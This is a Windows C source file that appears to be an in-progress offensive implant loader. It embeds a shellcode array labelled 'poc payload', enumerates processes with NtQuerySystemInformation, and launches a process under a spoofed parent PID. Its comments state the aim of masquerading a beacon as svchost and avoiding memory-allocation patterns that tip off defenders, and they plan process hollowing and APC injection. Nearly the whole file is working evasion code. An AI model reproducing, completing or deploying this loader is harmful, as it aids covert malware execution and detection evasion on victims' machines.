#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")


#define SystemProcessInformation 5
typedef __kernel_entry NTSTATUS (WINAPI * t_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// poc payload
unsigned char implant[] = 
    { 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
    0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
    0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
    0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
    0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
    0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
    0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
    0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
    0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48,
    0x8d, 0x8d, 0x24, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5,
    0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00,
    0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x1f, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba,
    0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x69, 0x6d, 0x70, 0x6f, 0x73, 0x74, 0x65, 0x72, 0x20, 0x69, 0x6d,
    0x70, 0x6c, 0x61, 0x6e, 0x74, 0x00, 0x69, 0x6e, 0x66, 0x6f, 0x00, 0x75, 0x73, 0x65,
    0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00 
};
unsigned int implant_size = sizeof(implant);


// process enumaeration `NtQuerySystemInfo` - SYSTEM_PROCESS_INFORMATION
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FSYSTEM_INFORMATION_CLASS.html

// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
// has anti-debug / registery and system recon and other loads of functionality to use
// TODO: NtQuerySystemInformation class has a crypto functionality; needs to be checked - less use of popular crypto APIs | crypto code
/**
 * @brief object enumeration - system info gathering
 * __kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
 * 
 * @return TBD
 */
DWORD get_target_proc_ppid(PWCHAR target_proc){

    DWORD pid = 0;

    // initial buffer to hold sysinfo class
    DWORD SysInfoBufferSize = 0;
    LPVOID SysInfoBuffer = NULL;
    SYSTEM_PROCESS_INFORMATION * SysInfoClass;

    t_NtQuerySystemInformation p_NtQuerySystemInformation;
    p_NtQuerySystemInformation = (t_NtQuerySystemInformation) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
    if(!p_NtQuerySystemInformation){
        printf("Loading NtQuerySystemInformation failed[%d]\n", GetLastError());
    } else {
        printf("Located export NtQuerySystemInformation at 0x[%p]\n", p_NtQuerySystemInformation);
    }

    // construct initial sysinfo struct
    p_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemProcessInformation, NULL, 0, &SysInfoBufferSize);
    if(!SysInfoBufferSize){
        printf("p_NtQuerySystemInformation failed[%d]\n", GetLastError());
    } else {
        printf("SystemInfo Struct Buffer allocated at 0x[%p], size [%x]\n", &SysInfoBufferSize, SysInfoBufferSize);
    }

    // allocate heap for SysInfoClass
    if(SysInfoBufferSize){
        // HeapAlloc commits a READWRITE block, better than VirtualAlloc that tips off with PAGE_READWRITE flag.
        SysInfoBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SysInfoBufferSize);
        SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) SysInfoBuffer;
        NTSTATUS nt_code = p_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemProcessInformation,
                                                        SysInfoClass,
                                                        SysInfoBufferSize,
                                                        &SysInfoBufferSize
                                                        );
        if(!nt_code){
            while(SysInfoClass->NextEntryOffset){
                printf("proc_name [%S]\n", SysInfoClass->ImageName.Buffer);
                if(lstrcmpiW(target_proc, SysInfoClass->ImageName.Buffer) == 0){
                    pid = (DWORD) SysInfoClass->UniqueProcessId;
                    break;
                } else {
                // check next entry
                    SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) ((ULONG_PTR)SysInfoClass + 
                                                                    SysInfoClass->NextEntryOffset);
                }
            }

        } else {
            printf("p_NtQuerySystemInformation process enumeration failed[%d]\n", GetLastError());
            return -2;
        }

    } else {
        printf("p_NtQuerySystemInformation initial Class alloc failed[%d]\n", GetLastError());
        return -1;
    }
    return pid;
}
// ppid spoofing
// masqurade beacon as svchost and spoof services.exe pid as ppid
// msdn example code for updating THREAD_ATTRIBUTE_LIST
// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
HANDLE create_spoof_target(LPCSTR target_proc, DWORD spoofed_ppid){

/*    
    typedef struct _STARTUPINFOEXA {
    STARTUPINFOA                 StartupInfo;               
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;     
    } STARTUPINFOEXA, *LPSTARTUPINFOEXA;

AttributeList is an array of keys specific to the created process - 
    i think its dynamic as msdn specifies its size initialization with MAX _DWORD_ bit mask set?

one key is protection level mask setting the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS bit

PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is an lp to parent process handle to use
parent process must have a PROCESS_CREATE_PROCESS access right
*/

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T AttributeListSize;

    ZeroMemory( &si, sizeof(STARTUPINFOEXA) );
    ZeroMemory( &pi, sizeof(pi) );
    si.StartupInfo.cb  = sizeof(STARTUPINFOEXA);
// protection level value for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    HANDLE hParent_spoofed = 0;
	
// initialize AttributeListSize
    InitializeProcThreadAttributeList( 
                                        NULL,                   // NULL as input to initalize
                                        1,                      // MAX count for dwAttributeCount _count of list attributes to update_ to get initial size
                                        0,                      // RESERVED - must be zero
                                        &AttributeListSize     // return AttributeListSize required size in bytes
                                    );

// allocate heap for AttributeList
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, AttributeListSize);

    if(!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &AttributeListSize)){
        printf("InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &AttributeListSize) failed[%d]\n", GetLastError());
    }

// update si.lpAttributeList to hold the hParent_spoofed
    hParent_spoofed = OpenProcess(
                                    PROCESS_CREATE_PROCESS | PROCESS_SUSPEND_RESUME  | PROCESS_VM_OPERATION | PROCESS_VM_READ ,
                                    // PROCESS_ALL_ACCESS,    // is it too noisy?   
                                    FALSE,         // inherit handle
                                    (DWORD)spoofed_ppid  // spoofed parent pid
                                    );
    if(!hParent_spoofed){
        printf("OpenProcess failed[%d]\n", GetLastError());
    }

    UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hParent_spoofed,
                        sizeof(HANDLE),
                        NULL,
                        NULL
                        );

    if(!CreateProcessA(
        NULL,                           // application name
        (LPCSTR) target_proc,             // commandline
        NULL,                           // process security attributes
        NULL,                           // thraed security attributes
        FALSE,                          // handle inheritence
        EXTENDED_STARTUPINFO_PRESENT ,               // creation flags - suspend main thread for injection - use extended MASKED si
        NULL,                           // use parent's environment block    // TODO: check to see changes in binary attributes
        NULL,                           // use parent's starting directory - //TODO: perfect to change dir attributes in binary signatures
        &si.StartupInfo,                // pointer to SPOOFED STARTUPINFO structure
        &pi                             // pointer to PROCESS INFORMATION structure
    )){
        printf("CreateProcessA failed[%d]\n", GetLastError());
    }
    // printf("Target Process [%s.exe] Created with pid [%d]\n", target_proc, pi.dwProcessId);
    // wait for process execution - till alerted / finished
    WaitForSingleObject(pi.hProcess, 10000);

// TODO: Manage HANDLE LEAKS!
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return pi.hProcess;

}


// process hollowing injection
// launch svchost.exe and inject beacon

// threadless execution - QueueAPC



int main(void){

    LPCSTR target_proc = "notepad";
    PWCHAR target_parent = L"explorer.exe";
    DWORD target_ppid = 0;
    HANDLE hTarget = 0;

    target_ppid = get_target_proc_ppid(target_parent);
    if(target_ppid){
        printf("Target Parent Process [%S] found, pid [%d]\n", target_parent, target_ppid);
    }
    hTarget = create_spoof_target(target_proc, target_ppid);
    if(hTarget){
        printf("Target Process [%s.exe], handle [%i]\n", target_proc, hTarget);
    }

    return 0;
}